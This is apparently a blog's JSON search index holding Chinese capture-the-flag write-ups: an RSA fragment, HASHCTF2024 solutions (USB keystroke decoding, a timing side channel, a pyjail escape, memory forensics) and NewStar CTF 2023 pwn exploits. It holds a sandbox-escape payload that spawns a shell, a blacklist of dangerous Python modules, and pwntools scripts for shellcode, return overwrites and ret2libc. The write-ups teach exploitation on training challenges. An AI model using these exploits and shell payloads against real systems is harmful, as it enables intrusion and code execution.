class=\"n\"\u003eq\u003c/span\u003e \u003cspan class=\"o\"\u003e**\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ep\u003c/span\u003e \u003cspan class=\"o\"\u003e**\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003epow\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003em\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ecipher\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003epow\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ecipher\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e7941371739956577280160664419383740967516918938781306610817149744988379280561359039016508679365806108722198157199058807892703837558280678711420411242914059658055366348123106473335186505617418956630780649894945233345985279471106888635177256011468979083320605103256178446993230320443790240285158260236926519042413378204298514714890725325831769281505530787739922007367026883959544239568886349070557272869042275528961483412544495589811933856131557221673534170105409\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e7515987842794170949444517202158067021118454558360145030399453487603693522695746732547224100845570119375977629070702308991221388721952258969752305904378724402002545947182529859604584400048983091861594720299791743887521228492714135449584003054386457751933095902983841246048952155097668245322664318518861440\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e1618155233923718966393124032999431934705026408748451436388483012584983753140040289666712916510617403356206112730613485227084128314043665913357106301736817062412927135716281544348612150328867226515184078966397180771624148797528036548243343316501503364783092550480439749404301122277056732857399413805293899249313045684662146333448668209567898831091274930053147799756622844119463942087160062353526056879436998061803187343431081504474584816590199768034450005448200\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003ccode\u003ec = pow(m, 2, r)\u003c/code\u003e\u003c/p\u003e","title":"CTF RSA 合集"},{"content":"下面是我在本次比赛出的题目的WriteUp\nSecret of Keyboard 签到脚本题，有些同学的脚本解出来大小写不正确可能是由于脚本无法识别shift+字母的组合键\n首先使用tshark：\ntshark -r usb.pcap -T fields -e usb.capdata | sed '/^\\s*$/d' \u0026gt; usbdata.txt\n提取数据并删除空格\n然后脚本一把梭出来：\nkeyboard.py:\nnormalKeys = { \u0026#34;04\u0026#34;:\u0026#34;a\u0026#34;, \u0026#34;05\u0026#34;:\u0026#34;b\u0026#34;, \u0026#34;06\u0026#34;:\u0026#34;c\u0026#34;, \u0026#34;07\u0026#34;:\u0026#34;d\u0026#34;, \u0026#34;08\u0026#34;:\u0026#34;e\u0026#34;, \u0026#34;09\u0026#34;:\u0026#34;f\u0026#34;, \u0026#34;0a\u0026#34;:\u0026#34;g\u0026#34;, \u0026#34;0b\u0026#34;:\u0026#34;h\u0026#34;, \u0026#34;0c\u0026#34;:\u0026#34;i\u0026#34;, \u0026#34;0d\u0026#34;:\u0026#34;j\u0026#34;, \u0026#34;0e\u0026#34;:\u0026#34;k\u0026#34;, \u0026#34;0f\u0026#34;:\u0026#34;l\u0026#34;, \u0026#34;10\u0026#34;:\u0026#34;m\u0026#34;, \u0026#34;11\u0026#34;:\u0026#34;n\u0026#34;, \u0026#34;12\u0026#34;:\u0026#34;o\u0026#34;, \u0026#34;13\u0026#34;:\u0026#34;p\u0026#34;, \u0026#34;14\u0026#34;:\u0026#34;q\u0026#34;, \u0026#34;15\u0026#34;:\u0026#34;r\u0026#34;, \u0026#34;16\u0026#34;:\u0026#34;s\u0026#34;, \u0026#34;17\u0026#34;:\u0026#34;t\u0026#34;, \u0026#34;18\u0026#34;:\u0026#34;u\u0026#34;, \u0026#34;19\u0026#34;:\u0026#34;v\u0026#34;, \u0026#34;1a\u0026#34;:\u0026#34;w\u0026#34;, \u0026#34;1b\u0026#34;:\u0026#34;x\u0026#34;, \u0026#34;1c\u0026#34;:\u0026#34;y\u0026#34;, \u0026#34;1d\u0026#34;:\u0026#34;z\u0026#34;,\u0026#34;1e\u0026#34;:\u0026#34;1\u0026#34;, \u0026#34;1f\u0026#34;:\u0026#34;2\u0026#34;, \u0026#34;20\u0026#34;:\u0026#34;3\u0026#34;, \u0026#34;21\u0026#34;:\u0026#34;4\u0026#34;, \u0026#34;22\u0026#34;:\u0026#34;5\u0026#34;, \u0026#34;23\u0026#34;:\u0026#34;6\u0026#34;,\u0026#34;24\u0026#34;:\u0026#34;7\u0026#34;,\u0026#34;25\u0026#34;:\u0026#34;8\u0026#34;,\u0026#34;26\u0026#34;:\u0026#34;9\u0026#34;, \u0026#34;27\u0026#34;:\u0026#34;0\u0026#34;,\u0026#34;28\u0026#34;:\u0026#34;\u0026lt;RET\u0026gt;\u0026#34;,\u0026#34;29\u0026#34;:\u0026#34;\u0026lt;ESC\u0026gt;\u0026#34;,\u0026#34;2a\u0026#34;:\u0026#34;\u0026lt;DEL\u0026gt;\u0026#34;, \u0026#34;2b\u0026#34;:\u0026#34;\\t\u0026#34;, \u0026#34;2c\u0026#34;:\u0026#34;\u0026lt;SPACE\u0026gt;\u0026#34;,\u0026#34;2d\u0026#34;:\u0026#34;-\u0026#34;,\u0026#34;2e\u0026#34;:\u0026#34;=\u0026#34;,\u0026#34;2f\u0026#34;:\u0026#34;[\u0026#34;,\u0026#34;30\u0026#34;:\u0026#34;]\u0026#34;,\u0026#34;31\u0026#34;:\u0026#34;\\\\\u0026#34;, \u0026#34;32\u0026#34;:\u0026#34;\u0026lt;NON\u0026gt;\u0026#34;,\u0026#34;33\u0026#34;:\u0026#34;;\u0026#34;,\u0026#34;34\u0026#34;:\u0026#34;\u0026#39;\u0026#34;,\u0026#34;35\u0026#34;:\u0026#34;\u0026lt;GA\u0026gt;\u0026#34;,\u0026#34;36\u0026#34;:\u0026#34;,\u0026#34;,\u0026#34;37\u0026#34;:\u0026#34;.\u0026#34;, \u0026#34;38\u0026#34;:\u0026#34;/\u0026#34;,\u0026#34;39\u0026#34;:\u0026#34;\u0026lt;CAP\u0026gt;\u0026#34;,\u0026#34;3a\u0026#34;:\u0026#34;\u0026lt;F1\u0026gt;\u0026#34;,\u0026#34;3b\u0026#34;:\u0026#34;\u0026lt;F2\u0026gt;\u0026#34;, \u0026#34;3c\u0026#34;:\u0026#34;\u0026lt;F3\u0026gt;\u0026#34;,\u0026#34;3d\u0026#34;:\u0026#34;\u0026lt;F4\u0026gt;\u0026#34;, \u0026#34;3e\u0026#34;:\u0026#34;\u0026lt;F5\u0026gt;\u0026#34;,\u0026#34;3f\u0026#34;:\u0026#34;\u0026lt;F6\u0026gt;\u0026#34;,\u0026#34;40\u0026#34;:\u0026#34;\u0026lt;F7\u0026gt;\u0026#34;,\u0026#34;41\u0026#34;:\u0026#34;\u0026lt;F8\u0026gt;\u0026#34;,\u0026#34;42\u0026#34;:\u0026#34;\u0026lt;F9\u0026gt;\u0026#34;,\u0026#34;43\u0026#34;:\u0026#34;\u0026lt;F10\u0026gt;\u0026#34;, \u0026#34;44\u0026#34;:\u0026#34;\u0026lt;F11\u0026gt;\u0026#34;,\u0026#34;45\u0026#34;:\u0026#34;\u0026lt;F12\u0026gt;\u0026#34;} shiftKeys = { \u0026#34;04\u0026#34;:\u0026#34;A\u0026#34;, \u0026#34;05\u0026#34;:\u0026#34;B\u0026#34;, \u0026#34;06\u0026#34;:\u0026#34;C\u0026#34;, \u0026#34;07\u0026#34;:\u0026#34;D\u0026#34;, \u0026#34;08\u0026#34;:\u0026#34;E\u0026#34;, \u0026#34;09\u0026#34;:\u0026#34;F\u0026#34;, \u0026#34;0a\u0026#34;:\u0026#34;G\u0026#34;, \u0026#34;0b\u0026#34;:\u0026#34;H\u0026#34;, \u0026#34;0c\u0026#34;:\u0026#34;I\u0026#34;, \u0026#34;0d\u0026#34;:\u0026#34;J\u0026#34;, \u0026#34;0e\u0026#34;:\u0026#34;K\u0026#34;, \u0026#34;0f\u0026#34;:\u0026#34;L\u0026#34;, \u0026#34;10\u0026#34;:\u0026#34;M\u0026#34;, \u0026#34;11\u0026#34;:\u0026#34;N\u0026#34;, \u0026#34;12\u0026#34;:\u0026#34;O\u0026#34;, \u0026#34;13\u0026#34;:\u0026#34;P\u0026#34;, \u0026#34;14\u0026#34;:\u0026#34;Q\u0026#34;, \u0026#34;15\u0026#34;:\u0026#34;R\u0026#34;, \u0026#34;16\u0026#34;:\u0026#34;S\u0026#34;, \u0026#34;17\u0026#34;:\u0026#34;T\u0026#34;, \u0026#34;18\u0026#34;:\u0026#34;U\u0026#34;, \u0026#34;19\u0026#34;:\u0026#34;V\u0026#34;, \u0026#34;1a\u0026#34;:\u0026#34;W\u0026#34;, \u0026#34;1b\u0026#34;:\u0026#34;X\u0026#34;, \u0026#34;1c\u0026#34;:\u0026#34;Y\u0026#34;, \u0026#34;1d\u0026#34;:\u0026#34;Z\u0026#34;,\u0026#34;1e\u0026#34;:\u0026#34;!\u0026#34;, \u0026#34;1f\u0026#34;:\u0026#34;@\u0026#34;, \u0026#34;20\u0026#34;:\u0026#34;#\u0026#34;, \u0026#34;21\u0026#34;:\u0026#34;$\u0026#34;, \u0026#34;22\u0026#34;:\u0026#34;%\u0026#34;, \u0026#34;23\u0026#34;:\u0026#34;^\u0026#34;,\u0026#34;24\u0026#34;:\u0026#34;\u0026amp;\u0026#34;,\u0026#34;25\u0026#34;:\u0026#34;*\u0026#34;,\u0026#34;26\u0026#34;:\u0026#34;(\u0026#34;,\u0026#34;27\u0026#34;:\u0026#34;)\u0026#34;, \u0026#34;28\u0026#34;:\u0026#34;\u0026lt;RET\u0026gt;\u0026#34;,\u0026#34;29\u0026#34;:\u0026#34;\u0026lt;ESC\u0026gt;\u0026#34;,\u0026#34;2a\u0026#34;:\u0026#34;\u0026lt;DEL\u0026gt;\u0026#34;, \u0026#34;2b\u0026#34;:\u0026#34;\\t\u0026#34;,\u0026#34;2c\u0026#34;:\u0026#34;\u0026lt;SPACE\u0026gt;\u0026#34;, \u0026#34;2d\u0026#34;:\u0026#34;_\u0026#34;,\u0026#34;2e\u0026#34;:\u0026#34;+\u0026#34;,\u0026#34;2f\u0026#34;:\u0026#34;{\u0026#34;,\u0026#34;30\u0026#34;:\u0026#34;}\u0026#34;,\u0026#34;31\u0026#34;:\u0026#34;|\u0026#34;,\u0026#34;32\u0026#34;:\u0026#34;\u0026lt;NON\u0026gt;\u0026#34;,\u0026#34;33\u0026#34;:\u0026#34;\\\u0026#34;\u0026#34;, \u0026#34;34\u0026#34;:\u0026#34;:\u0026#34;,\u0026#34;35\u0026#34;:\u0026#34;\u0026lt;GA\u0026gt;\u0026#34;,\u0026#34;36\u0026#34;:\u0026#34;\u0026lt;\u0026#34;,\u0026#34;37\u0026#34;:\u0026#34;\u0026gt;\u0026#34;,\u0026#34;38\u0026#34;:\u0026#34;?\u0026#34;,\u0026#34;39\u0026#34;:\u0026#34;\u0026lt;CAP\u0026gt;\u0026#34;,\u0026#34;3a\u0026#34;:\u0026#34;\u0026lt;F1\u0026gt;\u0026#34;, \u0026#34;3b\u0026#34;:\u0026#34;\u0026lt;F2\u0026gt;\u0026#34;, \u0026#34;3c\u0026#34;:\u0026#34;\u0026lt;F3\u0026gt;\u0026#34;,\u0026#34;3d\u0026#34;:\u0026#34;\u0026lt;F4\u0026gt;\u0026#34;,\u0026#34;3e\u0026#34;:\u0026#34;\u0026lt;F5\u0026gt;\u0026#34;,\u0026#34;3f\u0026#34;:\u0026#34;\u0026lt;F6\u0026gt;\u0026#34;,\u0026#34;40\u0026#34;:\u0026#34;\u0026lt;F7\u0026gt;\u0026#34;, \u0026#34;41\u0026#34;:\u0026#34;\u0026lt;F8\u0026gt;\u0026#34;,\u0026#34;42\u0026#34;:\u0026#34;\u0026lt;F9\u0026gt;\u0026#34;,\u0026#34;43\u0026#34;:\u0026#34;\u0026lt;F10\u0026gt;\u0026#34;,\u0026#34;44\u0026#34;:\u0026#34;\u0026lt;F11\u0026gt;\u0026#34;,\u0026#34;45\u0026#34;:\u0026#34;\u0026lt;F12\u0026gt;\u0026#34;} f=open(\u0026#39;usbdata.txt\u0026#39;,\u0026#39;r\u0026#39;) fi=open(\u0026#39;out.txt\u0026#39;,\u0026#39;w\u0026#39;) while 1: a=f.readline().strip() if a: if len(a)==16: # 鼠标流量的话len改为8 out=\u0026#39;\u0026#39; for i in range(0,len(a),2): if i+2 != len(a): out+=a[i]+a[i+1]+\u0026#34;:\u0026#34; else: out+=a[i]+a[i+1] fi.write(out) fi.write(\u0026#39;\\n\u0026#39;) else: break fi.close() output = [] keys = open(\u0026#39;out.txt\u0026#39;) for line in keys: try: if line[0]!=\u0026#39;0\u0026#39; or (line[1]!=\u0026#39;0\u0026#39; and line[1]!=\u0026#39;2\u0026#39;) or line[3]!=\u0026#39;0\u0026#39; or line[4]!=\u0026#39;0\u0026#39; or line[9]!=\u0026#39;0\u0026#39; or line[10]!=\u0026#39;0\u0026#39; or line[12]!=\u0026#39;0\u0026#39; or line[13]!=\u0026#39;0\u0026#39; or line[15]!=\u0026#39;0\u0026#39; or line[16]!=\u0026#39;0\u0026#39; or line[18]!=\u0026#39;0\u0026#39; or line[19]!=\u0026#39;0\u0026#39; or line[21]!=\u0026#39;0\u0026#39; or line[22]!=\u0026#39;0\u0026#39; or line[6:8]==\u0026#34;00\u0026#34;: continue if line[6:8] in normalKeys.keys(): output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==\u0026#39;2\u0026#39;] else: output += [\u0026#39;[unknown]\u0026#39;] except: pass keys.close() flag=0 print(\u0026#34;\u0026#34;.join(output)) for i in range(len(output)): try: a=output.index(\u0026#39;\u0026lt;DEL\u0026gt;\u0026#39;) del output[a] del output[a-1] except: pass for i in range(len(output)): try: if output[i]==\u0026#34;\u0026lt;CAP\u0026gt;\u0026#34;: flag+=1 output.pop(i) if flag==2: flag=0 if flag!=0: output[i]=output[i].upper() except: pass print (\u0026#39;output :\u0026#39; + \u0026#34;\u0026#34;.join(output)) Response Time 其实也算是个签到题，不过没多少人做/(ㄒoㄒ)/~~\n使用nc(netcat)连接之后，尝试输入flag头，猜测出每次输入时，如果当前位输入正确，输出响应的时间就会较长，然后会进入下一位的输入检测判断。\n为了方便大家理解，我在此贴出服务端代码：\nimport time import os banner =\u0026#39;\u0026#39;\u0026#39; /$$ /$$ | $$ |__/ /$$$$$$ /$$$$$$ /$$$$$$$ /$$$$$$ /$$$$$$ /$$$$$$$ /$$$$$$$ /$$$$$$ /$$$$$$ /$$ /$$$$$$/$$$$ /$$$$$$ /$$__ $$ /$$__ $$ /$$_____/ /$$__ $$ /$$__ $$| $$__ $$ /$$_____/ /$$__ $$ |_ $$_/ | $$| $$_ $$_ $$ /$$__ $$ | $$ \\__/| $$$$$$$$| $$$$$$ | $$ \\ $$| $$ \\ $$| $$ \\ $$| $$$$$$ | $$$$$$$$ | $$ | $$| $$ \\ $$ \\ $$| $$$$$$$$ | $$ | $$_____/ \\____ $$| $$ | $$| $$ | $$| $$ | $$ \\____ $$| $$_____/ | $$ /$$| $$| $$ | $$ | $$| $$_____/ | $$ | $$$$$$$ /$$$$$$$/| $$$$$$$/| $$$$$$/| $$ | $$ /$$$$$$$/| $$$$$$$ | $$$$/| $$| $$ | $$ | $$| $$$$$$$ |__/ \\_______/|_______/ | $$____/ \\______/ |__/ |__/|_______/ \\_______//$$$$$$\\___/ |__/|__/ |__/ |__/ \\_______/ | $$ |______/ | $$ |__/ \u0026#39;\u0026#39;\u0026#39; print(banner) flag=\u0026#39;\u0026#39; with open(\u0026#39;/flag\u0026#39;, \u0026#39;r\u0026#39;) as file: flag = file.read() flag=flag.strip() sum=0 print(\u0026#34;Can you find the secret of the response time?\u0026#34;) print() print() while(True): if sum==len(flag) : print(\u0026#39;Congratulations! you get it!\u0026#39;) exit(0) print(\u0026#39;Please input one character:\u0026#39;) ans=input(\u0026#39;\u0026gt; \u0026#39;) if ans != flag[sum] and len(ans)==1: print(\u0026#39;Who knows whether it is the right character?\u0026#39;) print() if ans == flag[sum] and len(ans)==1: time.sleep(1.5) print(\u0026#39;Who knows whether it is the right character?\u0026#39;) print() sum=sum+1 if len(ans)!=1: print(\u0026#39;Invalid input!\u0026#39;) print() 然后根据这个响应时间的特性，我们使用pwntools写出解题脚本\nexp：\nfrom pwn import * import time from tqdm import tqdm io = remote(\u0026#34;127.0.0.1\u0026#34;,45559) table = \u0026#39;-{}abcdefghigklmnopqrstuvwxyz1234567890!_ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39;#定义的字符表 flag=\u0026#39;\u0026#39; for j in table: for i in table: io.sendline(bytes(i.encode())) start_time = time.time() io.recvuntil(\u0026#39;Who knows whether it is the right character?\\n\u0026#39;,timeout=100000) end_time=time.time() response_time = end_time-start_time if(response_time\u0026gt;1): #如果响应时间大于1s，就添加进flag flag=flag+i print(flag) break #退出当次循环 爆一会就出来了\nPyjail 本题改编自2023强网杯Pyjail ! It’s myFILTER !!!\n源码如下：\nimport code, os, subprocess,re import pty def blacklist_fun_callback(*args): print(\u0026#34;You are Hacker!!!\u0026#34;) pty.spawn = blacklist_fun_callback os.system = blacklist_fun_callback os.popen = blacklist_fun_callback subprocess.Popen = blacklist_fun_callback subprocess.call = blacklist_fun_callback code.interact = blacklist_fun_callback code.compile_command = blacklist_fun_callback vars = blacklist_fun_callback attr = blacklist_fun_callback dir = blacklist_fun_callback getattr = blacklist_fun_callback exec = blacklist_fun_callback __import__ = blacklist_fun_callback compile = blacklist_fun_callback breakpoint = blacklist_fun_callback banner= print(banner) del os, subprocess, code, pty, blacklist_fun_callback input_code = input(\u0026#34;Can you input your code to escape \u0026gt; \u0026#34;) print(input_code) blacklist_words = [ \u0026#34;subprocess\u0026#34;, \u0026#34;os\u0026#34;, \u0026#34;code\u0026#34;, \u0026#34;interact\u0026#34;, \u0026#34;pty\u0026#34;, \u0026#34;pdb\u0026#34;, \u0026#34;platform\u0026#34;, \u0026#34;importlib\u0026#34;, \u0026#34;timeit\u0026#34;, \u0026#34;imp\u0026#34;, \u0026#34;commands\u0026#34;, \u0026#34;popen\u0026#34;, \u0026#34;load_module\u0026#34;, \u0026#34;spawn\u0026#34;, \u0026#34;system\u0026#34;, \u0026#34;/bin/sh\u0026#34;, \u0026#34;/bin/bash\u0026#34;, \u0026#34;flag\u0026#34;, \u0026#34;eval\u0026#34;, \u0026#34;exec\u0026#34;, \u0026#34;compile\u0026#34;, \u0026#34;input\u0026#34;, \u0026#34;vars\u0026#34;, \u0026#34;attr\u0026#34;, \u0026#34;dir\u0026#34;, \u0026#34;getattr\u0026#34; \u0026#34;__import__\u0026#34;, \u0026#34;__builtins__\u0026#34;, \u0026#34;__getattribute__\u0026#34;, \u0026#34;__class__\u0026#34;, \u0026#34;__base__\u0026#34;, \u0026#34;__subclasses__\u0026#34;, \u0026#34;__getitem__\u0026#34;, \u0026#34;__self__\u0026#34;, \u0026#34;__globals__\u0026#34;, \u0026#34;__init__\u0026#34;, \u0026#34;__name__\u0026#34;, \u0026#34;__dict__\u0026#34;, \u0026#34;._module\u0026#34;, \u0026#34;builtins\u0026#34;, \u0026#34;breakpoint\u0026#34;, \u0026#34;import\u0026#34;, ] def check(input_code): for x in blacklist_words: if x in input_code: print(\u0026#34;False\u0026#34;) return False return True while \u0026#39;{\u0026#39; in input_code and \u0026#39;}\u0026#39; in input_code and input_code.isascii() and check(input_code) and \u0026#34;eval\u0026#34; not in input_code and len(input_code) \u0026lt; 50 and \u0026#34;read\u0026#34; not in input_code : input_code = eval(f\u0026#34;f\u0026#39;{input_code}\u0026#39;\u0026#34;) print(input_code) else: print(\u0026#34;Player! Please obey the rules!\u0026#34;) 设置了黑名单，禁用了大部分的模块和模块自带的函数，同时还禁用了字符串\u0026quot;eval\u0026quot;和\u0026quot;read\u0026quot;（注意是字符串）,而且还规定了payload的长度不能超过50\n在本题中，我import了一个无用的模块\u0026quot;re\u0026quot;，并给出了提示：可以往某些模块里写一些东西\n我们知道，当这个python程序执行时，首先会执行import的模块，所以，我们可以往re里写入{open(\u0026quot;re.py\u0026quot;,\u0026quot;a\u0026quot;).write(\u0026quot;eva\u0026quot;\u0026quot;l(inpu\u0026quot;\u0026quot;t())\u0026quot;)}\n用\u0026quot;分隔来规避字符串检测，写入之后再重新访问，程序在执行re.py时，就会触发eval(input())，可以让我们输入任意代码并用eval()函数执行\n此时我们使用一句话RCE __import__('os').system('sh')，即可getshell\n我们二次元怎么你们了.png 被非预期了/(ㄒoㄒ)/~~（懒惰的出题人原题照搬的结果）\n首先是malkuu选手提供的非预期打法：（社工的神）\n然后是预期解：\n题目名称提示png，使用volatility -f [镜像路径] --profile=Win7SP1x64 filescan | grep png\n最后一行有个可疑文件Chuyin.png\n我们使用volatility -f [镜像路径] --profile=Win7SP1x64 dumpfiles -Q [文件地址] -D [保存路径]把图片dump下来\n然后使用图片隐写神器zsteg，一把梭\n再把flag头换成HASHCTF就行了。\n","permalink":"https://smera1d0.github.io/posts/hashctf2024-%E9%A2%98%E8%A7%A3/","summary":"\u003cp\u003e下面是我在本次比赛出的题目的WriteUp\u003c/p\u003e\n\u003ch1 id=\"secret-of-keyboard\"\u003eSecret of Keyboard\u003c/h1\u003e\n\u003cp\u003e签到脚本题，有些同学的脚本解出来大小写不正确可能是由于脚本无法识别\u003ccode\u003eshift+字母\u003c/code\u003e的组合键\u003c/p\u003e\n\u003cp\u003e首先使用tshark：\u003c/p\u003e","title":"HASHCTF2024 题解"},{"content":"1.ezshellcode 直接sendline(shellcode)即可 exp：\nfrom pwn import * p = remote(\u0026#34;node4.buuoj.cn\u0026#34;,29374) #p = process(\u0026#39;/home/miyu/Desktop/ezshellcode\u0026#39;) context(log_level = \u0026#39;debug\u0026#39;, arch = \u0026#39;amd64\u0026#39;, os = \u0026#39;linux\u0026#39;) shellcode=asm(shellcraft.sh()) #shellcode = b\u0026#39;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\u0026#39; payload = shellcode p.sendlineafter(\u0026#39;Show me your magic\\n\u0026#39;,payload) p.interactive() pwntools生成的shellcode和\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05都能过\n2.p1eee 开启了PIE，地址的后三位（1.5字节）是随机的\n发现了system(/bin/sh)，于是我们直接把后两个字节改为126C即可 exp：\nfrom pwn import * #p = process(\u0026#39;/home/miyu/Desktop/pwn (4)\u0026#39;) p = remote(\u0026#34;node4.buuoj.cn\u0026#34;,29573) #gdb.attach(p) offset = 0x20+8 p.sendline(b\u0026#39;a\u0026#39;*offset+p64(0x126C)) p.interactive() 3.newstar shop 通过购买机制让金钱变成负值即可，然后int型变量转化为unsigned int型变量即可进入后门\n4.Random 以时间作为随机数种子，生成了v8，然后要求我们输入v6，当v8=v6时才能进入if里，我们可以使用与远程环境一样的libc版本，也以time(0)作为随机数种子\nlibc = cdll.LoadLibrary(\u0026#39;libc.so.6\u0026#39;)\rlibc.srand(libc.time(0))\ra=libc.random()\rp.sendline(str(a)) 我们需要让v4%2=1,v3='0'才可以构造出system($0) system($0)是和system(/bin/sh)等价的 所以我们要对后两位随机数进行爆破，直到满足v4%2=1,v3='0'为止 每次爆破后需要暂停一秒，以刷新时间种子\n完整exp如下：\nfrom pwn import * from LibcSearcher import * from ctypes import * for i in range(100): p = remote(\u0026#34;node4.buuoj.cn\u0026#34;,27502) libc = cdll.LoadLibrary(\u0026#39;libc.so.6\u0026#39;) libc.srand(libc.time(0)) try: a=libc.random() b=libc.random() c=libc.random() if b%5==2: if c%2==1: p.sendline(str(a)) p.interactive() except: continue finally: p.close() sleep(1) 关于python中try、except、finally的用法，可以参考：\nhttps://blog.csdn.net/weixin_44828950/article/details/91471459\n5.ret2libc 发现存在pop rdi 观察main函数，可以利用puts函数泄露libc\nfrom pwn import * from LibcSearcher import * context(os=\u0026#34;linux\u0026#34;, arch=\u0026#34;amd64\u0026#34;, log_level=\u0026#34;debug\u0026#34;) elf = ELF(\u0026#39;/home/miyu/Desktop/ret2libc\u0026#39;) p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, 28784) pop_ret_rdi = 0x400763 ret = 0x400506 put_got = elf.got[\u0026#39;puts\u0026#39;] put_plt = elf.plt[\u0026#39;puts\u0026#39;] main_addr = 0x400698 offset = 0x20 + 8 payload = b\u0026#39;a\u0026#39; * offset + p64(pop_ret_rdi) + p64(put_got) + p64(put_plt) + p64(main_addr) p.sendline(payload) puts_addr = u64(p.recvuntil(b\u0026#39;\\x7f\u0026#39;)[-6:].ljust(8, b\u0026#39;\\x00\u0026#39;)) print(hex(puts_addr)) libc = LibcSearcher(\u0026#34;puts\u0026#34;, puts_addr) libc_base = puts_addr - libc.dump(\u0026#34;puts\u0026#34;) system_addr = libc.dump(\u0026#34;system\u0026#34;) + libc_base binsh_addr = libc.dump(\u0026#34;str_bin_sh\u0026#34;) + libc_base Payload = b\u0026#39;a\u0026#39; * offset + p64(ret) + p64(pop_ret_rdi) + p64(binsh_addr) + p64(system_addr) p.sendline(Payload) p.interactive() 64位用puts泄露libc 第一次payload泄露libc payload =b\u0026rsquo;A\u0026rsquo;*(0x20 +8) +p64(rdi_addr) +p64(elf.got[\u0026lsquo;puts\u0026rsquo;]) +p64(elf.plt[\u0026ldquo;puts\u0026rdquo;]) +p64(main_addr)\n第二次payload得shell payload=b\u0026rsquo;A\u0026rsquo;*(0x20 +8) +p64(ret_addr) +p64(rdi_addr) +p64(bin_sh) +p64(sys_addr)\nlibc版本选择1，得到flag\n","permalink":"https://smera1d0.github.io/posts/newstar-ctf-2023-pwn/","summary":"\u003ch2 id=\"1ezshellcode\"\u003e1.ezshellcode\u003c/h2\u003e\n\u003cp\u003e直接\u003ccode\u003esendline(shellcode)\u003c/code\u003e即可\nexp：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan 